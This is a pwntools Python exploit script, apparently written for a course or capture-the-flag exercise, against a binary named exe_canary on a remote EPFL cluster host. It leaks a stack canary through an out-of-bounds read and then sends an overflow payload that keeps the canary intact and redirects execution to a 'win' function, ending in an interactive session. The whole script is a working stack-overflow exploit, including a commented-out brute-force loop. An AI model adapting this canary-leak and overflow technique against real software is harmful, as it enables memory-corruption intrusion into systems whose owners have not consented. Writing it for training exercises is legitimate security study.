#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./exe_stack_bufov --host hexhive005.iccluster.epfl.ch --port 9001
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./exe_canary')

p = remote("hexhive005.iccluster.epfl.ch", 9002)

'''
for i in range(10, 15):

    p = process(exe.path)

    p.recvline()

    p.recv()

    p.sendline(b'0')

    p.recv()

    i_str = f'{i}'

    p.sendline(b'i_str')

    canary = u64(p.recv())
    print(canary)
    # log.success(f'Canary: {hex(canary)}')

    log.info(str(canary))

    # if (.... ends with two 00) BREAK
'''


# p = process(exe.path)

p.recvuntil(b'Your command: ')

p.sendline(b'0')  # 'send' or 'sendline'?

# receive "Tell me which slot you wanna read: "
p.recvuntil(b' read: ')
p.sendline(b'11')  # 'send' or 'sendline'?


# p.send(b'11')  # know the canary starts at offset 8*11

# print(p.recvall(timeout=1))

canary = p.recv(8)

print(canary)

p.recvuntil(b'Your command: ')

p.sendline(b'1')  # 'send' or 'sendline'?ç

p.recvuntil(b' write: ')

p.sendline(b'112')  # 'send' or 'sendline'?

p.recvuntil(b'max 8 bytes): ')

p.sendline(b'A'*88 + canary + b'A'*0 + p64(exe.symbols.win)*8)
# log.info(str(canary))
p.interactive()
